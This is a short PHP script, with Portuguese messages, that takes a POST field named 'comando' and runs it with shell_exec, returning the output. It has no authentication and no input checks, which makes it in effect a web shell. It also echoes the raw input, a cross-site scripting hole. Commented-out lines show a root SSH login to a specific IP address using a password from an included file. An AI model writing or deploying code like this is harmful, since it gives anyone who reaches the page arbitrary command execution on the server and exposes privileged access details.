<?php
// echo ('Hello');
// include('./_php/pass.php');

// $ip = '191.252.192.195';
// $port = 22;
// $user = 'root';

// $connection = ssh2_connect($ip, $port);
// ssh2_auth_password($connection, $user, $pass);

echo ($_POST[comando]);
if(empty($_POST[comando])) {
    echo ('<strong><p>Campo INPUT vazio</p></strong>');
    exit();
}
$script = isset($_POST['comando']) ? $_POST['comando'] : '';

$output = shell_exec($script);
echo "<p style='color: red;'>$output</p>";
?>